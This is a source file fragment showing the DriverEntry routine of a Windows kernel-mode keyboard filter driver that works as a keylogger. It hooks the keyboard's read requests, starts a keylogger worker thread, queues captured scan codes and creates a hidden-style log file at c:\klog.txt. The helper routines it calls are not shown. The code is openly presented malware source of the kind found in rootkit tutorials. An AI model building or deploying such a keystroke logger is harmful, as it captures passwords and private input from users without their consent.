//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = passive level
//@@@@@@@@@@@@@@@@@@@@@@@@@
extern "C" NTSTATUS DriverEntry( IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING RegistryPath )
{	
	NTSTATUS Status = {0};
	
	DbgPrint("Keyboard Filter Driver - DriverEntry\nCompiled at " __TIME__ " on " __DATE__ "\n");
 		
	/////////////////////////////////////////////////////////////////////////////////////////
	// Fill in IRP dispatch table in the DriverObject to handle I/O Request Packets (IRPs) 
	/////////////////////////////////////////////////////////////////////////////////////////
	
	// For a filter driver, we want pass down ALL IRP_MJ_XX requests to the driver which
	// we are hooking except for those we are interested in modifying.
	for(int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DispatchPassDown;
	DbgPrint("Filled dispatch table with generic pass down routine...\n");

	//Explicitly fill in the IRP's we want to hook
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
	
	//Go ahead and hook the keyboard now
	HookKeyboard(pDriverObject);
	DbgPrint("Hooked IRP_MJ_READ routine...\n");

	//Set up our worker thread to handle file writes of the scan codes extracted from the 
	//read IRPs
	InitThreadKeyLogger(pDriverObject);

	//Initialize the linked list that will serve as a queue to hold the captured keyboard scan codes
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension; 
	InitializeListHead(&pKeyboardDeviceExtension->QueueListHead);

	//Initialize the lock for the linked list queue
	KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);

	//Initialize the work queue semaphore
	KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0 , MAXLONG);

	//Create the log file
	IO_STATUS_BLOCK file_status;
	OBJECT_ATTRIBUTES obj_attrib;
	CCHAR		 ntNameFile[64] = "\\DosDevices\\c:\\klog.txt";
    STRING		 ntNameString;
	UNICODE_STRING uFileName;
    RtlInitAnsiString( &ntNameString, ntNameFile);
    RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE );
	InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	Status = ZwCreateFile(&pKeyboardDeviceExtension->hLogFile,GENERIC_WRITE,&obj_attrib,&file_status,
							NULL,FILE_ATTRIBUTE_NORMAL,0,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);
	RtlFreeUnicodeString(&uFileName);

	if (Status != STATUS_SUCCESS)
	{
		DbgPrint("Failed to create log file...\n");
		DbgPrint("File Status = %x\n",file_status);
	}
	else
	{
		DbgPrint("Successfully created log file...\n");
		DbgPrint("File Handle = %x\n",pKeyboardDeviceExtension->hLogFile);
	}

	// Set the DriverUnload procedure
	pDriverObject->DriverUnload = Unload;
	DbgPrint("Set DriverUnload function pointer...\n");
	DbgPrint("Exiting Driver Entry......\n");
	return STATUS_SUCCESS;
}